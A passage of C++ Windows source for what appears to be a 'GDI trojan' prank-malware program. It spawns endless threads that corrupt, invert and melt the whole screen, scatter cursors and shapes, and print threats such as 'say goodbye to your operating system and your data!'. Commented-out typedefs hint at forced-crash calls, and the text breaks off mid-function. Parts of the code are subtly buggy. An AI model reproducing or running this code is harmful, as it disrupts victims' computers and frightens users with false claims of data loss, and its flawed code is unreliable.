#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	FLOAT h, s, l;
} HSL;

namespace Colors {
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}

int stage = 0;
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) {
	switch (stage) {
	case 0:
		r = 255; b = 0; g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255; b = 0; r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255; r = 0; b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255; r = 0; g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255; g = 0; r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255; g = 0; b > 0 ? b -= shift : stage = 0;
		break;
	}
	return RGB(r, g, b);
}

COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0);
	if (clr == 1) return RGB(0, 255, 0);
	if (clr == 2) return RGB(0, 0, 255);
	if (clr == 3) return RGB(255, 0, 255);
	if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
	srand(GetTickCount());
	WCHAR string[32];
	for (int i = 0; i < 32; i++) {
		string[i] = (WCHAR)(rand() % 256) + 1;
	}
	return string;
}

DWORD WINAPI gdi1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, NOTSRCCOPY);
		BitBlt(hdc, rand() % 666, rand() % 666, w, h, hdc, rand() % 666, rand() % 666, NOTSRCCOPY);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader1(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	void* lpBits = VirtualAlloc(nullptr, 4 * (w + h * w), MEM_COMMIT, PAGE_READWRITE);
	while (true) {
		HDC hdc = GetDC(nullptr);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateBitmap(w, h, 1, 32, lpBits);
		SelectObject(mdc, hbit);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbit, 4 * h * w, lpBits);
		for (int j = 500; j < h * w; ++j) {
			DWORD* pixel = reinterpret_cast<DWORD*>(lpBits) + j;
			*pixel -= ((j % w) << 16) | (h << 8) | (j % w);
		}
		SetBitmapBits(hbit, 4 * h * w, lpBits);
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(mdc); DeleteObject(hbit);
	}
}

DWORD WINAPI shader2(LPVOID lpParam) {
	RGBQUAD rgbquadCopy;
	int i = 0;
	while (true) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
		RGBQUAD* rgbquad = NULL;
		HSL hslcolor;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x * h + y;
				int fx = (int)((i ^ 2) + (i * 2) * sqrt(i));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 500.f + y / h * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		for (int bl = 0; bl < h; bl += 1) {
			StretchBlt(hcdc, -2 + rand() % 5, bl, w, 1, hcdc, 0, bl, w, 1, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		i++;
	}
}

DWORD WINAPI shader3(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 255;
		for (int i = 0; w * h > i; i++) {
			if (i % h && rand() % 110)
				v = rand() % 100;
			*((BYTE*)data + 4 * i + v) -= 25;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI cur1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		LPCWSTR lpcur[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
		int count = rand() % 16;
		DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, lpcur[count]), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader4(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h, t = x ^ x | y;
			data[i].rgb -= t;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI shader5(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			data[i].rgb = (data[i].rgb * 2) % (RGB(0, 0, 255));
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI hexagon(LPVOID lpParam) {
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		int cx = x + 50, cy = y + 50;
		int rad = 50;
		POINT hexagonPoints[6];
		for (int i = 0; i < 6; ++i) {
			double angle = 2.0 * M_PI * i / 6;
			hexagonPoints[i].x = cx + static_cast<int>(rad * cos(angle));
			hexagonPoints[i].y = cy + static_cast<int>(rad * sin(angle));
		}
		HBRUSH brush = CreateSolidBrush(Hue(3));
		SelectObject(hdc, brush);
		Polygon(hdc, hexagonPoints, 5);
		if (cy >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (cx >= GetSystemMetrics(0)) {
			sx = -3;
		}
		if (cy <= 0) {
			sy = 1;
		}
		if (cx <= 0) {
			sx = 2;
		}
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i & h, y = i | w;
			rgbScreen[i].rgb -= x * y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader7(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCERASE);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 255;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 110)
				v = rand() % 25;
			((BYTE*)(data + i))[v * v] = ((BYTE*)(data + i + v))[v];
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI patmash(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, hdc, rand() % 5, rand() % 5, 0x1900AC010E);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shapes(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = (rand() % 3);
		HPEN pen = CreatePen(PS_SOLID, 5, Hue(3));
		SelectObject(hdc, pen);
		if (x == 0) {
			POINT pps[4];
			for (int i = 0; i < 4; i++) {
				pps[i].x = rand() % w;
				pps[i].y = rand() % h;
			}
			PolyBezier(hdc, pps, 4);
		}
		else if (x == 1) {
			POINT pt[4] = { rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h };
			Polyline(hdc, pt, 4);
		}
		else if (x == 2) {
			Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
		};
		DeleteObject(pen);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader8(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HWND wnd = GetDesktopWindow();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmp = { 40, w, h, 1, 24 };
	PRGBTRIPLE rgbtriple;
	while (true) {
		hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateDIBSection(hdc, &bmp, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(mdc, hbit);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			rgbtriple[i].rgbtRed -= 5;
			rgbtriple[i].rgbtGreen -= 10;
			rgbtriple[i].rgbtBlue -= 15;
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteDC(mdc); DeleteObject(hbit); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&w); DeleteObject(&h); DeleteObject(&bmp);
	}
}

DWORD WINAPI gdi10(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader9(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(0);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCERASE);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 255;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0)
				v = rand() % 25;
			*((BYTE*)data + 4 * i + v) = *((BYTE*)(data + i + v));
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI shader10(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb ^= (x * x + i) ^ (y * y + i) & x * y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI melt(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = rand() % w;
		BitBlt(hdc, x, 12, 120, h, hdc, x, 0, SRCPAINT);
		BitBlt(hdc, x, -11, -110, h, hdc, x, 0, SRCAND);
		ReleaseDC(0, hdc);
		Sleep(10);
		if ((rand() % 100 + 1) % 67 == 0) RedrawWindow(0, 0, 0, 133);
	}
}

DWORD WINAPI octagon(LPVOID lpParam) {
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		int cx = x + 50, cy = y + 50;
		int rad = 50;
		POINT octagonPoints[8];
		for (int i = 0; i < 8; ++i) {
			double angle = 2.0 * M_PI * i / 8;
			octagonPoints[i].x = cx + static_cast<int>(rad * sqrt(angle));
			octagonPoints[i].y = cy + static_cast<int>(rad * sin(angle));
		}
		HBRUSH brush = CreateSolidBrush(Hue(3));
		SelectObject(hdc, brush);
		Polygon(hdc, octagonPoints, 8);
		if (cy >= GetSystemMetrics(1)) {
			sy = -2;
		}
		if (cx >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (cy <= 0) {
			sy = 2;
		}
		if (cx <= 0) {
			sx = 1;
		}
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader11(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h, t = y ^ y | x;
			data[i].rgb -= RGB(x, t, y);
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI gdi14(LPVOID lpParam) {
	int mode = 2;
	int bw = 240, bh = 240;
	while (true) {
		int can1 = 1;
		int jia1 = 0, jia2 = 0;
		int x, y, x1 = 0, y1 = 0, x2 = 0, y2 = 0;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BOOL bianliang1 = true;
		while (bianliang1) {
			jia1 = jia1 + bw;
			if (jia1 > w) { bianliang1 = false; }
			else { can1 = can1 + 1; }
		}
		can1 = can1 + 1;
		bianliang1 = true;
		int can2 = 1;
		while (bianliang1) {
			jia2 = jia2 + bh;
			if (jia2 > h) { bianliang1 = false; }
			else { can2 = can2 + 1; }
		}
		can2 = can2 + 1;
		HDC hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < can2 + 1; i++) {
			for (int k = 0; k < can1 + 1; k++) {
				x = rand() % can1; y = i;
				if (x == 1) { x1 = 0; }
				else if (x == 2) { x1 = bw; }
				else { x1 = bw * x - bw; }
				if (y == 1) { y1 = 0; }
				else if (y == 2) { y1 = bh; }
				else { y1 = bh * y - bh; }
				x = rand() % can1;
				y = rand() % can2;
				if (x == 1) { x2 = 0; }
				else if (x == 2) { x2 = bw; }
				else { x2 = bw * x - 1; }
				if (y == 1) { y2 = 0; }
				else if (y == 2) { y2 = bh; }
				else { y2 = bh * y - 1; }
				StretchBlt(mdc, x1, y1, bw, bh, hdc, x2, y2, bw, bh, SRCCOPY);
			}
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		jia1 = 0; jia2 = 0;
		can1 = 0; can2 = 0;
		if (mode == 1) { bw += 1; bh += 1; }
		else { bw -= 1; bh -= 1; }
		if (bw < 40) { mode = 1; }
		else if (bw > 240) { mode = 2; }
		else if (bw == 240) { mode = 2; }
		ReleaseDC(0, hdc);
		DeleteObject(mdc); DeleteObject(hbit);
	}
}

DWORD WINAPI textout(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int randnum = 1 + rand() % 11;
		LPCSTR name = NULL;
		if (randnum == 1) { name = "System"; }
		else if (randnum == 2) { name = "Courier New"; }
		else if (randnum == 3) { name = "Fredoka"; }
		else if (randnum == 4) { name = "Comic Sans MS"; }
		else if (randnum == 5) { name = "Times New Roman"; }
		else if (randnum == 6) { name = "Roman"; }
		else if (randnum == 7) { name = "Script"; }
		else if (randnum == 8) { name = "Impact"; }
		else if (randnum == 9) { name = "Trebuchet MS"; }
		else if (randnum == 10) { name = "Consolas"; }
		HFONT hfnt = CreateFontA(rand() % 100, rand() % 100, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, name);
		SelectObject(hdc, hfnt);
		LPCSTR things[] = {
			"argentum", "what were you thinking?", "element 47",
			"made by N17Pro3426", "it's no escape now!",
			"say goodbye to your operating system and your data!"
		};
		int thing = rand() % _countof(things);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
		DeleteObject(hfnt);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI shader12(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(0);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCERASE);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 255;
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			if (i % h == 0 && rand() % 100 == 0)
				v = rand() % 1000;
			*((BYTE*)data + 4 * i + v) = (x ^ y) ^ byte;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI shader13(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)(x ^ y) + y;
				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader14(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].rgb -= 666;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader15(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
